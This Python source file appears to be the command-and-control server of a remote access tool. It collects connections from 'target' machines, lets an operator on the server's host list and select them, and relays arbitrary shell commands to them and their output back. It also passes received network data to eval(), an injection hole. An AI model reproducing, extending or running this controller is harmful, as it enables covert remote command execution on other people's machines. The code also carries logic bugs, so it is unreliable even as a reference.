import socket
import threading
import os
# Server
HOST = "192.168.18.1"
PORT = 8585
BIND = (HOST,PORT)

NoRespondMsg_CLI = '[!] connection was to CLI_server was closed'

with socket.socket() as server :
    print('[Starting] Server Is Starting...')
    server.bind(BIND)
    server.listen()
    print('[Listing] Server Is Listning...')
    connections = {}

    def handling_client(select_conn,select_addr):
        connections[addr] = select_conn
        print(f'NEW CLIENT CONNEXTION {select_addr}')

    def handling_cli_server(conn,addr):
        # print(f'[+] CLI_SERVER CONNECT ON {addr}')
        def handling_selected_client(connection, addr):
            # print(f'[!] Waiting for a Command from {addr} ')
            cmd = conn.recv(3600).decode() # get command fro cli server
            if cmd == 'exit' and cmd[0:2] != 'cd' :
                # print('exiting...')
                handling_cli_server(conn, addr)
            elif cmd == 'pwd' and cmd[0:2] != 'cd':
                connection.sendall("pwd".encode())
                get_pwd = connection.recv(3600).decode()
                conn.sendall(get_pwd.encode())
            elif cmd[0:2] == 'cd':
                connection.sendall(cmd.encode())
                checkpath = connection.recv(3600).decode()
                if checkpath == 'TRUEPATH' :
                    print(checkpath)
                    conn.sendall('TRUEPATH'.encode())
                if checkpath == 'FALSEPATH':
                    print(checkpath)
                    conn.sendall('FALSEPATH'.encode())

            else :
                connection.sendall(cmd.encode()) # send cmd to target
                cmd_output = connection.recv(3600) # get output from target
                conn.sendall(cmd_output) # send output to cli server
        while True :
            cli_server_req = conn.recv(3600).decode()
            if cli_server_req == 'listen2rcv':
                if connections:
                    conn.sendall(str(connections.keys()).encode())
                elif not connections:
                    conn.sendall('NOCONNECTIONWASFOUND'.encode())
            elif cli_server_req == 'RUNCMDONCLIENT' :
                conn.sendall('SENDTARGETCONN'.encode())
                gettargetaddr = conn.recv(3600).decode()
                gettargetaddr = eval(gettargetaddr)
                gettargetconn = connections[gettargetaddr]
                if gettargetconn and gettargetaddr :
                    while gettargetconn and gettargetaddr :

                        thread_handling_selected_client = threading.Thread(target=handling_selected_client,args=(gettargetconn,gettargetaddr))
                        thread_handling_selected_client.start()
                        thread_handling_selected_client.join()

    while True:
        conn, addr = server.accept()
        if conn and addr[0] != HOST:
            client_thread = threading.Thread(target=handling_client,args=(conn,addr))
            client_thread.start()
        if conn and addr[0] == HOST:
            cli_server_thread = threading.Thread(target=handling_cli_server,args=(conn,addr))
            cli_server_thread.start()
